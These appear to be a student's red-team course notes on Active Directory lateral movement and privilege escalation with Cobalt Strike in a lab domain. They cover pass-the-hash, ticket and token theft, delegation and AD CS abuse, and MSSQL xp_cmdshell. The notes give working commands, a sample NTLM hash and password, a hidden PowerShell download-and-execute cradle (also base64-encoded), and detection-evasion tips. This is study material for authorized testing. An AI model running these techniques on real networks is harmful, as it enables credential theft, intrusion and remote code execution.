## Pass the Hash

---

1. Attempt to list the C$ share of the WEB machine - this will fail because bfarmer is not a local admin there.
```
beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> ls \\web.dev.cyberbotic.io\c$
[-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```
2. Then run the `pth` command with a username and its NTLM hash.
```
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
```
3. Attempt to list the C$ share again, which will succeed.
```
beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 11:02:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     08/31/2022 17:40:32   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     08/30/2022 11:16:24   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     08/30/2022 20:19:27   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/01/2022 07:26:41   DumpStack.log.tmp
 384mb    fil     09/01/2022 07:26:41   pagefile.sys
```
4. To "drop" impersonation afterwards, use the `rev2self` command.
```
beacon> rev2self
[*] Tasked beacon to revert token

beacon> ls \\web.dev.cyberbotic.io\c$
[-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

**OPSEC**  
  
Two opportunities to detect PTH are the R/W handle to LSASS; and looking for the `echo foo > \\.\pipe\bar` pattern in command-line logs.


## Pass the Ticket

---

Pass the ticket is a technique that allows you to add Kerberos tickets to an existing logon session (LUID) that you have access to, or a new one you create.  Accessing a remote resource will then allow that authentication to happen via Kerberos.

1. Create a "sacrificial" logon session that we can pass the TGT into. [[Rubeus#createonly]]
2. Pass the TGT into this new LUID. [[Rubeus#ptt]]
3. Impersonate the process we created with `steal_token`
```
beacon> steal_token 4748

beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 11:02:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     08/31/2022 17:40:32   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     08/30/2022 11:16:24   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     08/30/2022 20:19:27   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/01/2022 07:26:41   DumpStack.log.tmp
 384mb    fil     09/01/2022 07:26:41   pagefile.sys
```
4. Use `rev2self` to drop the impersonation.  To destroy the logon session we created, simply kill the process with the `kill` command.
```
beacon> rev2self
beacon> kill 4748
```

**OPSEC**  
  
By default, Rubeus will use a random username, domain and password with CreateProcessWithLogonW, which will appear in the associated 4624 logon event.

We can provide these options on the command line to make the fields appear less anomalous.  The password does not have to be the users' actual password.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
```


## Overpass the Hash

---

Overpass the hash is a technique which allows us to request a Kerberos TGT for a user, using their NTLM or AES hash.  Elevated privileges are required to obtain user hashes, but not to actually request a ticket.

[[Rubeus#asktgt]]

This TGT can then be leveraged via Pass the Ticket.

**OPSEC**

Using an NTLM hash results in a ticket encrypted using RC4 (0x17).  This is considered a legacy encryption type and therefore often stands out as anomalous in a modern Windows environment.

**More OPSEC**  
  
Mimikatz can also perform overpass the hash, but in a way that writes into LSASS.  Rubeus' method doesn't touch LSASS but it does generate Kerberos traffic from an anomalous process, as this usually only occurs from LSASS.


## Token Impersonation

---

If we list the running processes on Workstation 2 from an elevated prompt, we see that jking is running an instance of mmc.exe.

```
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 5536  1020  mmc.exe                                x64   0           DEV\jking
```

We can simply steal its token and access a target.

```
beacon> steal_token 5536
```

The downside is that if the user closes the process, our ability to abuse it goes away.  By taking the additional steps of extracting tickets or hashes, we provide ourselves a more guaranteed or "future-proof" way of leveraging the credential material.


## Token Store

---

This is an evolution on the steal_token command which allows you to steal and store tokens for future use.  For example, steal a token and add it to the token store with `token-store steal <pid>`.

```
beacon> token-store steal 5536
[*] Stored Tokens

 ID   PID   User
 --   ---   ----
 0    5536  DEV\jking
```

You may list all the tokens in the store with `token-store show` and impersonate one using `token-store use <id>`.

```
beacon> token-store use 0
[+] Impersonated DEV\jking
```

The rev2self command will drop the impersonation token, but it will remain in the store so that it can be impersonated again.  A token can be removed from the store using `token-store remove <id>` or the entire store flushed with `token-store remove-all`.

The primary advantages of the token store are two-fold.  The first is that we don't have to carry out the stealing process multiple times, which is better OPSEC.  Since stealing a token requires opening a handle to the target process and process token, the fewer times you do that, the better.  The second is that maintaining an open handle to the duplicated token prevents Windows from disposing of the user's logon session if they were to logoff or terminate the process we stole from.

It's important to note that each Beacon has its own token store.  You cannot transfer tokens from one Beacon to another, even if they're on the same host.


## Make Token

---

The `make_token` command allows you to impersonate a user if you know their plaintext password.  This works under the hood by calling the [LogonUserA](https://learn.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-logonusera) API, which takes several parameters including a username, password, domain name and logon type.

The API outputs a handle to a token which can then be passed to the [ImpersonateLoggedOnUser](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser) API.  This allows the calling thread to impersonate the context of token (i.e. the impersonated user's context).

```
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\jking (netonly)
```

The logon session created with LogonUserA has the same local identifier as the caller but the alternate credentials are used when accessing a remote resource.

```
beacon> remote-exec winrm web.dev.cyberbotic.io whoami
dev\jking
```

This also means that `make_token` is not applicable to anything you may want to run on the current machine.  For that, `spawnas` may be a better solution.


## Process Injection

---

Process injection allows us to inject arbitrary shellcode into a process of our choosing.  You can only inject into processes that you can obtain a handle to with enough privileges to write into its memory.  In a non-elevated context, which usually limits you to your own processes.  In an elevated context, this includes processes owned by other users.

Beacon has two main injection commands - `shinject` and `inject`.  `shinject` allows you to inject any arbitrary shellcode from a binary file on your attacking machine; and `inject` will inject a full Beacon payload for the specified listener.

```
beacon> inject 4464 x64 tcp-local
```

Where:

- 4464 is the target PID.
- x64 is the architecture of the process.
- tcp-local is the listener name.

The command will also automatically attempt to connect to the child if a P2P listener is used.  The resulting Beacon will run with the full privilege of the user who owns the process.

The same caveats also apply - if the user closes this process, the Beacon will be lost.  The shellcode that's injected uses the Exit Thread function, so it won't kill the process if we exit the Beacon.


## Unconstrained Delegation

---

Delegation allows a user or machine to act on behalf of another user to another service. Unconstrained Delegation, when configured on a computer, the KDC includes a copy of the user's TGT inside the TGS. An interesting aspect to unconstrained delegation is that it will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached.  If we can compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use them to impersonate the users against other services in the domain.

This query will return all computers that are permitted for unconstrained delegation.

[[ADSearch#Enumerate Computers for Unconstrained Delegation]]

Rubeus `triage` will show all the tickets that are currently cached.  TGTs can be identified by the krbtgt service.

[[Rubeus#triage]]

We can simply extract this TGT and leverage it via a new logon session.

1. [[Rubeus#dump]]
2. [[Rubeus#createonly]]
3. `beacon> steal_token <PID>`

We can also obtain TGTs for computer accounts by forcing them to authenticate remotely to this machine. We will utilise Rubeus' `monitor` command.  This will drop into loop and continuously monitor for and extract new TGT as they get cached.  It's a superior strategy when compared to running triage manually because there's little chance of us not seeing or missing a ticket.

1. [[Rubeus#monitor]]
2. Next, run SharpSpoolTrigger.
```
C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
```
Where:

- DC-2 is the "target".
- WEB is the "listener".
3. Rubeus will then capture the ticket.
4. To stop Rubeus, use the `jobs` and `jobkill` commands.


## Constrained Delegation

---

Constrained delegation aims to restrict the services to which the server can act on behalf of a user.  It no longer allows the server to cache the TGTs of other users, but allows it to request a TGS for another user with its own TGT.

To find computers configured for constrained delegation, search for those whose  `msds-allowedtodelegateto` attribute is not empty.

1. [[ADSearch#Enumerate Computers and Users for Constrained Delegation]]
2. Perform delegation with [[Rubeus#dump]] (You can also request one with Rubeus `asktgt` if you have NTLM or AES hashes.)
3. [[Rubeus#s4u]]
4. Grab the final S4U2Proxy ticket and pass it into a new logon session with [[Rubeus#createonly#Pass the Ticket]]
5. `beacon> steal_token <PID>`


## Alternate Service Name

---

The CIFS service can be leveraged for listing and transferring files, but what if port 445 was unavailable or we wanted an option for lateral movement?

In the Kerberos authentication protocol, a service validates an inbound ticket by ensuring that it's encrypted with that service's symmetric key.  This key is derived from the password hash of the principal running the service.  Most services run in the SYSTEM context of a computer account, e.g. SQL-2$.  Therefore, all service tickets, whether they be for CIFS, TIME, or HOST, etc, will be encrypted with the same key.  The SPN does not factor into ticket validation.

Furthermore, the SPN information in the ticket (i.e. the sname field) is not encrypted and can be changed arbitrarily.  That means we can request a service ticket for a service, such as CIFS, but then modify the SPN to something different, such as LDAP, and the target service will accept it happily.

We can be abuse this using `/altservice` flag in Rubeus.  In this example, I'm using the same TGT for SQL-2 to request a TGS for LDAP instead of CIFS.

1. [[Rubeus#s4u self#altservice]]
2. [[Rubeus#createonly#Pass the Ticket]]
3. `steal_token <PID>`

Against a domain controller, the LDAP service allows us to perform a [[Credential Theft#DCSync]]


## S4U2Self Abuse

---

S4U2Self allows a service to obtain a TGS to itself on behalf of a user, and S4U2Proxy allows the service to obtain a TGS on behalf of a user to a second service.

In the Unconstrained Delegation module, we obtained a TGT for the domain controller.  If you tried to pass that ticket into a logon session and use it to access the C$ share (like we would with a user TGT), it would fail.
This is because machines do not get remote local admin access to themselves.  What we can do instead is abuse S4U2Self to obtain a usable TGS as a user we know _is_ a local admin (e.g. a domain admin).  Rubeus has a `/self` flag for this purpose.

1. [[Rubeus#s4u self]]
2. [[Rubeus#createonly#Pass the Ticket]]
3. `steal_token <PID>`


## Resource-Based Constrained Delegation

---

Enabling unconstrained or constrained delegation on a computer requires the [SeEnableDelegationPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/enable-computer-and-user-accounts-to-be-trusted-for-delegation) user right assignment on domain controllers, which is only granted to enterprise and domain admins.  Windows 2012 introduced a new type of delegation called resource-based constrained delegation (RBCD), which allows the delegation configuration to be set on the target rather than the source.

The two major prerequisites to pull off the attack are:

1. A target computer on which you can modify msDS-AllowedToActOnBehalfOfOtherIdentity.
2. Control of another principal that has an SPN.

This query will obtain every domain computer and read their ACL, filtering on the interesting rights.  This will produce a handful of results, but the one shown is the one of interest.  It shows that the Developers group has WriteProperty rights on all properties (see the ObjectAceType) for DC-2.

```
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```

To start the attack, we need its SID.
```
beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
```

We'll then use this inside an SDDL to create a security descriptor.  The content of msDS-AllowedToActOnBehalfOfOtherIdentity must be in raw binary format.

```
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)
```

 These descriptor bytes can then be used with `Set-DomainObject`.  However, since we're working through Cobalt Strike, everything has to be concatenated into a single PowerShell command.
 
```
beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
```

```
beacon> powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

Next, we use the WKSN-2$ account to perform the S4U impersonation with Rubeus.  The `s4u` command requires a TGT, RC4 or AES hash.  Since we already have elevated access to it, we can just extract its TGT from memory.

1. [[Rubeus#triage]]
2. [[Rubeus#dump]]
3. [[Rubeus#s4u]]
4. [[Rubeus#createonly#Pass the Ticket]]

To clear up, simply remove the msDS-AllowedToActOnBehalfOfOtherIdentity entry on the target.

```
beacon> powershell Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

If you did not have local admin access to a computer already, you can resort to creating your own computer object.  By default, even domain users can join up to 10 computers to a domain - controlled via the _ms-DS-MachineAccountQuota_ attribute of the domain object.

```
beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
```

[StandIn](https://github.com/FuzzySecurity/StandIn) is a post-ex toolkit written by [Ruben Boonen](https://twitter.com/FuzzySec) and has the functionality to create a computer with a random password.

```
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
```

Rubeus `hash` can take that password and calculate their hashes.
[[Rubeus#hash]]

These can then be used with `asktgt` to obtain a TGT for the fake computer.
[[Rubeus#asktgt]]

And the rest of the attack is the same.


## Active Directory Certificate Services

---

Active Directory Certificate Services (AD CS) is a server role that allows you to build a public key infrastructure (PKI).  This can provide public key cryptography, digital certificates, and digital signature capabilities.  Some practical applications include Secure/Multipurpose Internet Mail Extensions (S/MIME), secure wireless networks, virtual private network (VPN), Internet Protocol security (IPsec), Encrypting File System (EFS), smart card logon, and Secure Socket Layer/Transport Layer Security (SSL/TLS).

Correct implementation can improve the security of an organisation:

- Confidentiality through encryption.
- Integrity through digital signatures.
- Authentication by associating certificate keys with computer, user, or device accounts on the network.

### Finding Certificate Authorities

To find AD CS Certificate Authorities (CA's) in a domain or forest, run [Certify](https://github.com/GhostPack/Certify) with the cas parameter.

[[Certify#cas]]

### Misconfigured Certificate Template

AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.

[[Certify#find]] can also find vulnerable templates.

 _DEV\Domain Users_ have enrollment rights, so any domain user may request a certificate from this template.
 This configuration allows any domain user to request a certificate for any other domain user (including a domain admin) and use it for authentication.  Request a certificate for nlamb.
 
[[Certify#request#Custom User]]

Copy the whole certificate (both the private key and certificate) and save it to `cert.pem` on Ubuntu WSL.  Then use the provided `openssl` command to convert it to pfx format.

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Convert `cert.pfx` into a base64 encoded string so it can be used with Rubeus

```
cat cert.pfx | base64 -w 0
```

Then use `asktgt` to request a TGT for the user using the certificate.

[[Rubeus#asktgt#Request Using Certificate]]


## MSSQL Impersonation

---

[[Pivoting#Pivoting with Kerberos]]

MS SQL impersonation, or context switching, is a means which allows the executing user to assume the permissions of another user without needing to know their password.  One handy use case for the feature is to allow administrators to impersonate a user for testing purposes, e.g. a user is having a problem and they want to eliminate permissions as an issue.

Impersonations must be explicitly granted through securable configurations.

We can discover accounts to impersonate manually using the following queries:

``` sql
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/faf/047/15b/impersonations.png)

This shows that the `grantee_principal_id`, 268, is allowed to impersonate the `grantor_principal_id`, 267.  The IDs don't mean much, so we can look them up with:

``` sql
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/582/4f2/a54/principals.png)

Here, we see that 267 is DEV\mssql_svc and 268 is DEV\Domain Users.

You can also write your own SQL query that will join these two, or use SQLRecon's impersonate module.

[[SQLRecon#Impersonate Accounts on an Instance]]

```
[*] Enumerating accounts that can be impersonated on sql-2.dev.cyberbotic.io,1433
name | 
-------
DEV\mssql_svc |
```

We can take advantage of this as bfarmer, who we know is not a sysadmin.

```
SELECT SYSTEM_USER;
DEV\bfarmer

SELECT IS_SRVROLEMEMBER('sysadmin');
0
```

Use `EXECUTE AS` to execute a query in the context of the target.

```
EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
DEV\mssql_svc

EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
1
```

SQLRecon modules can also be run in "impersonation mode" by prefixing the module name with an `i` and specifying the principal to impersonate.

[[SQLRecon#Impersonate Accounts on an Instance#Run Modules]]


### Command Execution

PowerUpSQL: [[PowerUpSQL#Invoke-SQLOSCmd]]

To enumerate the current state of xp_cmdshell, use:
``` sql
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
```

To enable xp_cmdshell:
``` sql
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

SQLRecon also has a module for interacting with the xp_cmdshell configuration, which can also be combined with the impersonation module.

[[SQLRecon#Impersonate Accounts on an Instance#xp_cmdshell Interaction]]

With command execution, we can work towards executing a Beacon payload.  As with other servers in the lab, the SQL servers cannot talk directly to our team server in order to download a hosted payload.  Instead, we must setup a reverse port forward to tunnel that traffic through our C2 chain.

```
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

```
rportfwd 8080 127.0.0.1 80
```

Next, host `smb_x64.ps1` at `/b` on the team server.  We know SMB will work because we can validate that port 445 is open on the target SQL server.

```
beacon> portscan 10.10.122.25 445
```

We can now download and execute the payload, for example:

```
powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
```

OR

```
powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=
```

You can then link to the Beacon.

```
beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
```

What payload would you use if port 445 was closed?  Experiment with using the pivot listener here instead of SMB.